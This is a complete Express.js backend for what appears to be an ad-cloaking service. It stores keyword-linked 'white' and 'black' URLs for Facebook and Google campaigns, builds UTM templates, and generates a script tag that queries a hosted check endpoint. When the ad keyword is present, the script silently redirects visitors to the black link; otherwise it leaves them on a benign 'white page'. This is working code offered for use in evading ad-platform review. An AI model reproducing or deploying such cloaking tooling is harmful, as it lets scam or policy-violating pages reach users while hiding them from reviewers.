const express = require('express');
const cors = require('cors');
const { createClient } = require('@supabase/supabase-js');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// In-memory storage fallback for cloud deployments
let memoryConfigs = [];

// Middleware
app.use(cors({
  origin: ['http://localhost:4200', 'https://localhost:4200'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());

// Supabase configuration
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_ANON_KEY;

let useSupabase = true;
let supabase = null;

console.log('🔧 Environment check:');
console.log('SUPABASE_URL:', supabaseUrl || '❌ Missing');
console.log('SUPABASE_ANON_KEY:', supabaseKey ? '✅ Set (hidden)' : '❌ Missing');
console.log('🗄️ Database Status:');

if (!supabaseUrl || !supabaseKey) {
  console.error('❌ CRITICAL: Supabase credentials not found!');
  console.error('❌ This application requires Supabase for data persistence.');
  console.error('❌ Please set SUPABASE_URL and SUPABASE_ANON_KEY environment variables.');
  console.warn('⚠️ USANDO ARMAZENAMENTO EM MEMÓRIA (dados serão perdidos ao reiniciar)');
  console.warn('⚠️ CURRENT DATABASE: IN-MEMORY STORAGE');
  useSupabase = false;
} else {
  try {
    supabase = createClient(supabaseUrl, supabaseKey);
    useSupabase = true;
    console.log('✅ CURRENT DATABASE: SUPABASE');
    console.log('✅ Supabase URL:', supabaseUrl);
  } catch (error) {
    console.error('❌ Failed to initialize Supabase client:', error);
    useSupabase = false;
  }
}


// Generate UTM parameters
function generateUTM(campaignType, keyword) {
  const baseParams = `utm_source=${campaignType.toUpperCase()}&keyword=${keyword}`;
  
  if (campaignType === 'facebook') {
    return `${baseParams}&utm_campaign={{campaign.name}}|{{campaign.id}}&utm_medium={{adset.name}}|{{adset.id}}&utm_content={{ad.name}}|{{ad.id}}&utm_term={{placement}}`;
  } else if (campaignType === 'google') {
    return `${baseParams}&utm_campaign={campaignid}&utm_medium={network}&utm_content={adgroupid}&utm_term={keyword}`;
  }
  
  return baseParams;
}

// Generate obfuscated JS content
function generateObfuscatedJSContent(keyword) {
  return `(function(){
  const urlParams = new URLSearchParams(window.location.search);
  if (urlParams.has('keyword') && urlParams.get('keyword') === '${keyword}') {
    fetch('https://backend-jknh.onrender.com/api/check?keyword=${keyword}')
      .then(response => response.json())
      .then(data => {
        if (data.redirect && data.url) {
          window.location.replace(data.url);
        }
      })
      .catch(error => {
        console.log('Verification failed, staying on white page');
      });
  }
})();`;
}

// Generate verification script
function generateScript(keyword) {
  return `<script>
(function(){
  const urlParams = new URLSearchParams(window.location.search);
  if (urlParams.has('keyword')) {
    fetch('https://backend-jknh.onrender.com/api/check?keyword=' + urlParams.get('keyword'))
      .then(response => response.json())
      .then(data => {
        if (data.redirect && data.url) {
          window.location.replace(data.url);
        }
      })
      .catch(error => {
        console.log('Verification failed, staying on white page');
      });
  }
})();
</script>`;
}

// API Routes

// Create new configuration
app.post('/api/configs', async (req, res) => {
  try {
    console.log('📝 POST /api/configs - Request received');
    console.log('📝 Request body:', req.body);
    console.log('📝 Content-Type:', req.headers['content-type']);
    
    console.log('📝 Creating new configuration:', req.body);
    
    const { keyword, whiteLink, blackLink, campaignType } = req.body;
    
    console.log('📝 Extracted fields:', { keyword, whiteLink, blackLink, campaignType });
    
    // Validate required fields
    if (!keyword || !whiteLink || !blackLink || !campaignType) {
      console.log('❌ Missing required fields');
      return res.status(400).json({ error: 'Missing required fields' });
    }
    
    // Validate campaign type
    if (!['facebook', 'google'].includes(campaignType)) {
      console.log('❌ Invalid campaign type:', campaignType);
      return res.status(400).json({ error: 'Invalid campaign type. Must be facebook or google' });
    }
    
    console.log('📝 Using Supabase:', useSupabase);
    console.log('📝 Supabase client exists:', !!supabase);
    
    let data;
    
    if (useSupabase) {
      if (!supabase) {
        console.error('❌ Supabase client is null but useSupabase is true');
        throw new Error('Supabase client not initialized');
      }
      
      console.log('🔍 Using Supabase - Checking if keyword exists:', keyword);
      
      try {
        // Check if keyword already exists
        const { data: existing, error: checkError } = await supabase
          .from('link_configs')
          .select('*')
          .eq('keyword', keyword)
          .single();
        
        console.log('🔍 Existing check result:', { existing, checkError });
        
        if (checkError && checkError.code !== 'PGRST116') {
          console.error('❌ Error checking existing keyword:', checkError);
          console.warn('⚠️ Supabase check failed, falling back to memory storage');
          useSupabase = false;
        } else if (existing) {
          console.log('❌ Keyword already exists:', keyword);
          return res.status(400).json({ error: 'Keyword already exists' });
        }
        
        if (useSupabase) {
          console.log('💾 Inserting new configuration into Supabase');
          
          // Create new configuration
          const insertData = {
            keyword,
            white_link: whiteLink,
            black_link: blackLink,
            campaign_type: campaignType
          };
          
          console.log('💾 Insert data:', insertData);
          
          const { data: supabaseData, error } = await supabase
            .from('link_configs')
            .insert([insertData])
            .select()
            .single();
          
          console.log('💾 Insert result:', { supabaseData, error });
          
          if (error) {
            console.error('❌ Supabase insert error:', error);
            console.error('❌ Error details:', JSON.stringify(error, null, 2));
            console.warn('⚠️ Supabase insert failed, falling back to memory storage');
            useSupabase = false;
          } else {
            data = supabaseData;
          }
        }
      } catch (supabaseErr) {
        console.error('❌ Supabase operation failed:', supabaseErr);
        console.warn('⚠️ Falling back to memory storage');
        useSupabase = false;
      }
    }
    
    if (!useSupabase || !data) {
      console.log('🔍 Using in-memory storage - Checking if keyword exists:', keyword);
      
      // Check if keyword already exists
      const existing = memoryConfigs.find(c => c.keyword === keyword);
      if (existing) {
        console.log('❌ Keyword already exists:', keyword);
        return res.status(400).json({ error: 'Keyword already exists' });
      }
      
      console.log('💾 Inserting new configuration into memory');
      
      // Create new configuration
      const newConfig = {
        id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
        keyword,
        white_link: whiteLink,
        black_link: blackLink,
        campaign_type: campaignType,
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString()
      };
      
      memoryConfigs.push(newConfig);
      data = newConfig;
    }
    
    console.log('✅ Configuration created successfully:', data.id);
    
    // Generate UTM and script
    const utm = generateUTM(campaignType, keyword);
    const scriptContent = generateObfuscatedJSContent(keyword);
    const scriptTag = `<script>${scriptContent}</script>`;
    const apiUrl = `https://backend-jknh.onrender.com/api/check?keyword=${keyword}`;
    
    const response = {
      config: {
        id: data.id,
        keyword: data.keyword,
        whiteLink: data.white_link,
        blackLink: data.black_link,
        campaignType: data.campaign_type,
        createdAt: data.created_at
      },
      utm,
      scriptTag,
      scriptContent,
      apiUrl
    };
    
    console.log('✅ Sending response:', response);
    
    res.json(response);
  } catch (error) {
    console.error('❌ Server error:', error);
    console.error('Error stack:', error.stack);
    console.error('Error name:', error.name);
    console.error('Error message:', error.message);
    
    // Send more detailed error information
    let errorMessage = 'Internal server error';
    
    if (error.message) {
      if (error.message.includes('already exists')) {
        errorMessage = 'Keyword already exists';
        return res.status(400).json({ error: errorMessage });
      } else if (error.message.includes('not initialized')) {
        errorMessage = 'Database connection not available';
        return res.status(503).json({ error: errorMessage });
      } else {
        errorMessage = error.message;
      }
    }
    
    res.status(500).json({ 
      error: errorMessage,
      message: 'Server encountered an error while processing your request',
      details: process.env.NODE_ENV === 'development' ? error.stack : undefined
    });
  }
});

// Get all configurations
app.get('/api/configs', async (req, res) => {
  try {
    let data;
    
    if (useSupabase) {
      console.log('📋 Fetching configurations from Supabase');
      const { data: supabaseData, error } = await supabase
        .from('link_configs')
        .select('*')
        .order('created_at', { ascending: false });
      
      if (error) {
        throw error;
      }
      
      data = supabaseData;
    } else {
      console.log('📋 Fetching configurations from memory');
      data = memoryConfigs.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
    }
    
    const configs = data.map(item => ({
      id: item.id,
      keyword: item.keyword,
      whiteLink: item.white_link,
      blackLink: item.black_link,
      campaignType: item.campaign_type,
      createdAt: item.created_at
    }));
    
    res.json(configs);
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Delete configuration
app.delete('/api/configs/:id', async (req, res) => {
  try {
    const { id } = req.params;
    
    if (useSupabase) {
      console.log('🗑️ Deleting configuration from Supabase:', id);
      const { error } = await supabase
        .from('link_configs')
        .delete()
        .eq('id', id);
      
      if (error) {
        throw error;
      }
    } else {
      console.log('🗑️ Deleting configuration from memory:', id);
      memoryConfigs = memoryConfigs.filter(c => c.id !== id);
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Check keyword and redirect (This is the main API endpoint)
app.get('/api/check', async (req, res) => {
  try {
    const { keyword } = req.query;
    
    if (!keyword) {
      return res.json({ redirect: false, message: 'No keyword provided' });
    }
    
    let data = null;
    
    if (useSupabase) {
      console.log('🔍 Checking keyword in Supabase:', keyword);
      const { data: supabaseData, error } = await supabase
        .from('link_configs')
        .select('*')
        .eq('keyword', keyword)
        .single();
      
      if (error) {
        if (error.code !== 'PGRST116') { // PGRST116 is "not found", which is expected
          throw error;
        }
      }
      
      data = supabaseData;
    } else {
      console.log('🔍 Checking keyword in memory:', keyword);
      data = memoryConfigs.find(c => c.keyword === keyword);
    }
    
    if (!data) {
      return res.json({ redirect: false, message: 'Keyword not found' });
    }
    
    // Return black link for redirect
    res.json({
      redirect: true,
      url: data.black_link,
      message: 'Keyword verified'
    });
  } catch (error) {
    console.error('Server error:', error);
    res.json({ redirect: false, message: 'Server error' });
  }
});

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Start server
app.listen(PORT, () => {
  console.log('\n🚀 Server started successfully!');
  console.log(`📡 Backend: http://localhost:${PORT}`);
  console.log(`📊 Dashboard: http://localhost:4200`);
  console.log(`🔗 Health check: http://localhost:${PORT}/health`);
  console.log('\n📋 Available endpoints:');
  console.log('  POST /api/configs - Create configuration');
  console.log('  GET  /api/configs - List configurations');
  console.log('  GET  /api/check   - Check keyword redirect');
  console.log('\n');
});

module.exports = app;
